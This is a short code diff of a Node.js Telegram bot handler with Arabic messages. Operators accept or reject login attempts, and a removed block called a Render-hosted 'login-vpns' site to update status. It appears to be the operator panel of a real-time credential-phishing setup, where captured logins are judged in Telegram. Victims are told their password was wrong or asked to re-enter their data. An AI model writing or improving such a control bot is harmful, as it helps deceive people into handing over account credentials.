@@ -15,21 +15,15 @@ bot.on('callback_query', async (callbackQuery) => {
 
     console.log('📥 تم الضغط على الزر:', action);
 
-    // رابط الموقع المرفوع على Render
-    const baseUrl = 'https://login-vpns.onrender.com';
-
     try {
         if (action === 'accept') {
-            await fetch(`${baseUrl}/update-status?action=accept`);
-            bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول. سيتم التوجيه...');
-        }
-
-        if (action === 'reject') {
-            await fetch(`${baseUrl}/update-status?action=reject`);
-            bot.sendMessage(chatId, '❌ كلمة المرور التي أدخلتها غير صحيحة.');
+            bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول. يرجى إعادة إدخال بياناتك في الموقع.');
+        } else if (action === 'reject') {
+            bot.sendMessage(chatId, '❌ كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مجددًا.');
         }
     } catch (err) {
         console.error('❌ خطأ أثناء المعالجة:', err);
+        bot.sendMessage(chatId, '⚠️ حدث خطأ أثناء المعالجة، حاول مرة أخرى.');
     }
 
     bot.answerCallbackQuery(callbackQuery.id);
